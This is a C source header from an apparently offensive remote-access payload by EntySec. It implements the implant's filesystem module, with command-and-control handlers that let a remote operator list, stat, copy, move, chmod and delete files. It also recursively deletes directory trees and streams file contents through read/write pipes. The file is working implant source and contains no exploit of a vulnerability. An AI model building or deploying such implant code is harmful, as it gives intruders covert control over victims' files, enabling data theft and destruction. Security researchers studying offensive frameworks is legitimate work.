/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _FS_H_
#define _FS_H_

#include <errno.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/stat.h>
#include <glob.h>
#include <libgen.h>
#include <eio.h>

#include <c2.h>
#include <api.h>
#include <tlv.h>
#include <tlv_types.h>
#include <pipe.h>
#include <log.h>

#define FS_BASE 3

#define FS_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL)
#define FS_STAT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 1)
#define FS_GETWD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 2)
#define FS_MKDIR \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 3)
#define FS_CHMOD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 4)
#define FS_CHDIR \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 5)
#define FS_FILE_DELETE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 6)
#define FS_FILE_COPY \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 7)
#define FS_FILE_MOVE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 8)
#define FS_DIR_DELETE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       FS_BASE, \
                       API_CALL + 9)

#define FS_PIPE_FILE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        FS_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_MODE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, FS_BASE, API_TYPE)

#if defined(IS_MACOS) || defined(IS_IPHONE)
#include <libkern/OSByteOrder.h>
#define st_mtim st_mtimespec
#define st_ctim st_ctimespec
#define st_atim st_atimespec
#define htole32(x) OSSwapHostToLittleInt32(x)
#define htole64(x) OSSwapHostToLittleInt64(x)
#else
#include <endian.h>
#endif

#ifdef IS_WINDOWS
#ifndef S_ISLNK
#define	S_ISLNK(mode) (0)
#endif
#endif

#ifndef GLOB_TILDE
#define GLOB_TILDE 0
#endif

struct stat_table
{
    uint32_t dev;
    uint32_t mode;
    uint32_t nlink;
    uint32_t uid;
    uint32_t gid;
    uint32_t rdev;
    uint64_t ino;
    uint64_t size;
    uint64_t atime;
    uint64_t mtime;
    uint64_t ctime;
} __attribute__((packed));

typedef struct tree
{
    void *cb_data;
    eio_cb cb;
    eio_req *group_dents;
    eio_req *group_dir;
    char path[PATH_MAX];
} tree_t;

eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data);

static int tree_group_add(eio_req *group, eio_req *request)
{
    if (!request)
    {
        group->result = -1;
        return -1;
    }

    eio_grp_add(group, request);
    return 0;
}

static int tree_dir_set(eio_req *request)
{
    tree_t *tree;

    tree = request->data;

    if (request->result < 0)
    {
        tree->group_dir->result = request->result;
    }

    return request->result;
}

static int tree_dents_set(eio_req *request)
{
    tree_t *tree;

    tree = request->data;

    if (request->result < 0)
    {
        tree->group_dents->result = request->result;
    }

    return request->result;
}

static int tree_stat(eio_req *request)
{
    tree_t *tree;
    char *path;
    EIO_STRUCT_STAT *buffer;
    eio_req *new_request;

    tree = request->data;
    path = EIO_PATH(request);
    buffer = (EIO_STRUCT_STAT *)request->ptr2;

    if (tree_dents_set(request) < 0)
    {
        return request->result;
    }

    if (S_ISDIR(buffer->st_mode))
    {
        new_request = eio_rmtree(path, 0, tree_dents_set, tree);
    }
    else
    {
        new_request = eio_unlink(path, 0, tree_dents_set, tree);
    }

    return tree_group_add(tree->group_dents, new_request);
}

static int tree_dir(eio_req *request)
{
    tree_t *tree;
    eio_cb cb;

    tree = request->data;
    cb = tree->cb;
    request->data = tree->cb_data;

    free(tree);

    if (!cb)
    {
        return request->result;
    }

    return cb(request);
}

static int tree_dents(eio_req *request)
{
    tree_t *tree;

    tree = request->data;

    if (tree_dir_set(request) < 0)
    {
        return request->result;
    }

    return tree_group_add(tree->group_dir, eio_rmdir(tree->path, 0, tree_dir_set, tree));
}

static int tree_readdir(eio_req *request)
{
    tree_t *tree;
    int iter;
    int error;
    char *path;
    char *name;
    char fq_path[PATH_MAX + 1];

    tree = request->data;
    path = tree->path;
    name = (char *)request->ptr2;

    if (tree_dents_set(request) < 0)
    {
        return request->result;
    }

    for (iter = 0; iter < request->result; iter++)
    {
        snprintf(fq_path, sizeof(fq_path), "%s/%s", path, name);
        error = tree_group_add(tree->group_dents, eio_lstat(fq_path, 0, tree_stat, tree));

        if (error)
        {
            return error;
        }

        name += strlen(name) + 1;
    }

    return 0;
}

eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data)
{
    tree_t *tree;

    tree = malloc(sizeof(*tree));

    if (tree == NULL)
    {
        return NULL;
    }

    strncpy(tree->path, path, PATH_MAX);

    tree->cb = cb;
    tree->cb_data = data;

    tree->group_dents = eio_grp(tree_dents, tree);
    tree->group_dir = eio_grp(tree_dir, tree);

    if (!tree->group_dents && !tree->group_dir)
    {
        free(tree);
        return NULL;
    }

    if (path == NULL)
    {
        tree->group_dents->result = -1;
        tree->group_dir->result = -1;
    }
    else
    {
        tree_group_add(tree->group_dents, eio_readdir(path, EIO_READDIR_STAT_ORDER, pri, tree_readdir, tree));
        eio_grp_add(tree->group_dir, tree->group_dents);
    }

    return tree->group_dir;
}

static void fs_add_stat(tlv_pkt_t **tlv_pkt, EIO_STRUCT_STAT *stat)
{
    struct stat_table stat_buffer;

    stat_buffer.dev = htole32(stat->st_dev);
    stat_buffer.mode = htole32(stat->st_mode);
    stat_buffer.nlink = htole32(stat->st_nlink);
    stat_buffer.uid = htole32(stat->st_uid);
    stat_buffer.gid = htole32(stat->st_gid);
    stat_buffer.rdev = htole32(stat->st_rdev);

    stat_buffer.ino = htole64(stat->st_ino);
    stat_buffer.size = htole64(stat->st_size);

#ifndef IS_WINDOWS
    stat_buffer.mtime = htole64(stat->st_mtim.tv_sec);
    stat_buffer.atime = htole64(stat->st_atim.tv_sec);
    stat_buffer.ctime = htole64(stat->st_ctim.tv_sec);
#endif

    tlv_pkt_add_raw(*tlv_pkt, TLV_TYPE_BYTES, &stat_buffer, sizeof(stat_buffer));
}

static int fs_eio(eio_req *request)
{
    int status;
    c2_t *c2;

    c2 = request->data;

    status = request->result < 0 ? API_CALL_FAIL : API_CALL_SUCCESS;
    c2->response = api_craft_tlv_pkt(status);

    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);

    return 0;
}

static int fs_eio_stat(eio_req *request)
{
    c2_t *c2;

    c2 = request->data;

    if (request->result < 0)
    {
        c2->response = api_craft_tlv_pkt(API_CALL_FAIL);
    }
    else
    {
        c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS);
        fs_add_stat(&c2->response, (EIO_STRUCT_STAT *)request->ptr2);
    }

    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);

    return 0;
}

static void fs_eio_list_glob(eio_req *request)
{
    c2_t *c2;
    tlv_pkt_t *stat_result;

    char *name;
    char path[PATH_MAX];
    struct stat stat_buffer;

    glob_t glob_result;
    size_t iter;

    c2 = request->data;
    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);

    memset(&glob_result, 0, sizeof(glob_result));

    if (glob(path, GLOB_TILDE, NULL, &glob_result) != 0)
    {
        c2->response = api_craft_tlv_pkt(API_CALL_FAIL);
    }
    else
    {
        c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS);

        for (iter = 0; iter < glob_result.gl_pathc; iter++)
        {
            stat_result = tlv_pkt_create();
            name = glob_result.gl_pathv[iter];

            tlv_pkt_add_string(stat_result, TLV_TYPE_FILENAME, basename(name));
            tlv_pkt_add_string(stat_result, TLV_TYPE_PATH, name);

            if (stat(name, &stat_buffer) == 0)
            {
                fs_add_stat(&stat_result, &stat_buffer);
            }

            tlv_pkt_add_tlv(c2->response, TLV_TYPE_GROUP, stat_result);
            tlv_pkt_destroy(stat_result);
        }
    }

    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);
}

static int fs_eio_list(eio_req *request)
{
    c2_t *c2;
    int iter;
    tlv_pkt_t *stat_result;

    char path[PATH_MAX];
    char fq_path[PATH_MAX];

    char *name;
    char *names;

    struct stat stat_buffer;
    struct eio_dirent *entry;
    struct eio_dirent *entries;

    c2 = request->data;
    c2->response = api_craft_tlv_pkt(API_CALL_FAIL);

    if (request->result < 0)
    {
        c2->response = api_craft_tlv_pkt(API_CALL_FAIL);
    }
    else
    {
        tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
        c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS);

        entries = (struct eio_dirent *)request->ptr1;
        names = (char *)request->ptr2;

        for (iter = 0; iter < request->result; iter++)
        {
            stat_result = tlv_pkt_create();

            entry = entries + iter;
            name = names + entry->nameofs;

            snprintf(fq_path, sizeof(fq_path), "%s/%s", path, name);

            tlv_pkt_add_string(stat_result, TLV_TYPE_FILENAME, name);
            tlv_pkt_add_string(stat_result, TLV_TYPE_PATH, fq_path);

            if (stat(fq_path, &stat_buffer) == 0)
            {
                fs_add_stat(&stat_result, &stat_buffer);
            }

            tlv_pkt_add_tlv(c2->response, TLV_TYPE_GROUP, stat_result);
            tlv_pkt_destroy(stat_result);
        }
    }

    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);

    return 0;
}

static int fs_eio_dir_delete(eio_req *request)
{
    c2_t *c2;
    char *path;
    EIO_STRUCT_STAT *buffer;
    eio_req *new_request;

    c2 = request->data;
    path = EIO_PATH(request);
    buffer = (EIO_STRUCT_STAT *)request->ptr2;
    new_request = NULL;

    if (request->result < 0)
    {
        return fs_eio(request);
    }

    if (S_ISLNK(buffer->st_mode))
    {
        new_request = eio_unlink(path, 0, fs_eio, c2);
    }
    else if (S_ISDIR(buffer->st_mode))
    {
        new_request = eio_rmtree(path, 0, fs_eio, c2);
    }

    if (!new_request)
    {
        request->result = -1;
        fs_eio(request);
    }

    return request->result;
}

static void fs_eio_file_copy(struct eio_req *request)
{
    c2_t *c2;
    FILE *source;
    FILE *dest;

    int status;
    char src[PATH_MAX];
    char dst[PATH_MAX];
    char buffer[4096];
    size_t bytes;

    c2 = request->data;
    status = API_CALL_SUCCESS;

    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, src);
    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, dst);

    source = fopen(src, "rb");

    if (source == NULL)
    {
        status = API_CALL_FAIL;
        goto fail;
    }

    dest = fopen(dst, "wb");

    if (dest == NULL)
    {
        status = API_CALL_FAIL;
        goto fail;
    }

    while ((bytes = fread(buffer, sizeof(char), sizeof(buffer), source)) > 0)
    {
        if (fwrite(buffer, sizeof(char), bytes, dest) != bytes)
        {
            fclose(source);
            fclose(dest);
            status = API_CALL_FAIL;
            goto fail;
        }
    }

    fclose(source);
    fclose(dest);

fail:
    c2->response = api_craft_tlv_pkt(status);
    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);
}

static tlv_pkt_t *fs_list(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);

    if (strchr(path, '*') != NULL)
    {
        eio_custom(fs_eio_list_glob, 0, NULL, c2);
        return NULL;
    }

    if (eio_readdir(path, EIO_READDIR_DENTS, 0, fs_eio_list, c2) == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return NULL;
}

static tlv_pkt_t *fs_stat(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
    eio_stat(path, 0, fs_eio_stat, c2);

    return NULL;
}

static tlv_pkt_t *fs_getwd(c2_t *c2)
{
    char path[PATH_MAX];
    tlv_pkt_t *result;

    if (getcwd(path, sizeof(path)) == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
    tlv_pkt_add_string(result, TLV_TYPE_PATH, path);

    return result;
}

static tlv_pkt_t *fs_mkdir(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
    eio_mkdir(path, 0777, 0, fs_eio, c2);

    return NULL;
}

static tlv_pkt_t *fs_chmod(c2_t *c2)
{
    int mode;
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &mode);

    eio_chmod(path, mode, 0, fs_eio, c2);
    return NULL;
}

static tlv_pkt_t *fs_file_delete(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);
    eio_unlink(path, 0, fs_eio, c2);

    return NULL;
}

static tlv_pkt_t *fs_chdir(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);

    if (chdir(path) == -1)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *fs_file_copy(c2_t *c2)
{
    eio_custom(fs_eio_file_copy, 0, NULL, c2);
    return NULL;
}

static tlv_pkt_t *fs_file_move(c2_t *c2)
{
    char src[PATH_MAX];
    char dst[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, src);
    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, dst);

    eio_rename(src, dst, 0, fs_eio, c2);
    return NULL;
}

static tlv_pkt_t *fs_dir_delete(c2_t *c2)
{
    char path[PATH_MAX];

    tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, path);

    eio_lstat(path, 0, fs_eio_dir_delete, c2);
    return NULL;
}

static int fs_file_create(pipe_t *pipe, c2_t *c2)
{
    char path[PATH_MAX];
    char mode[PATH_MAX];

    FILE *file;

    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, path);
    tlv_pkt_get_string(c2->request, TLV_TYPE_MODE, mode);

    file = fopen(path, mode);

    if (!file)
    {
        return -1;
    }

    pipe->data = file;
    return 0;
}

static int fs_file_read(pipe_t *pipe, void *buffer, int length)
{
    FILE *file;

    file = pipe->data;
    return fread(buffer, 1, length, file);
}

static int fs_file_write(pipe_t *pipe, void *buffer, int length)
{
    FILE *file;

    file = pipe->data;
    return fwrite(buffer, 1, length, file);
}

static int fs_file_seek(pipe_t *pipe, int offset, int whence)
{
    FILE *file;

    file = pipe->data;
    return fseek(file, offset, whence);
}

static int fs_file_tell(pipe_t *pipe)
{
    FILE *file;

    file = pipe->data;
    return ftell(file);
}

static int fs_file_destroy(pipe_t *pipe, c2_t *c2)
{
    FILE *file;

    file = pipe->data;
    return fclose(file);
}

void register_fs_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, FS_LIST, fs_list);
    api_call_register(api_calls, FS_STAT, fs_stat);
    api_call_register(api_calls, FS_GETWD, fs_getwd);
    api_call_register(api_calls, FS_MKDIR, fs_mkdir);
    api_call_register(api_calls, FS_CHMOD, fs_chmod);
    api_call_register(api_calls, FS_CHDIR, fs_chdir);
    api_call_register(api_calls, FS_FILE_DELETE, fs_file_delete);
    api_call_register(api_calls, FS_FILE_COPY, fs_file_copy);
    api_call_register(api_calls, FS_FILE_MOVE, fs_file_move);
    api_call_register(api_calls, FS_DIR_DELETE, fs_dir_delete);
}

void register_fs_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    callbacks.create_cb = fs_file_create;
    callbacks.read_cb = fs_file_read;
    callbacks.write_cb = fs_file_write;
    callbacks.seek_cb = fs_file_seek;
    callbacks.tell_cb = fs_file_tell;
    callbacks.destroy_cb = fs_file_destroy;

    api_pipe_register(pipes, FS_PIPE_FILE, callbacks);
}

#endif
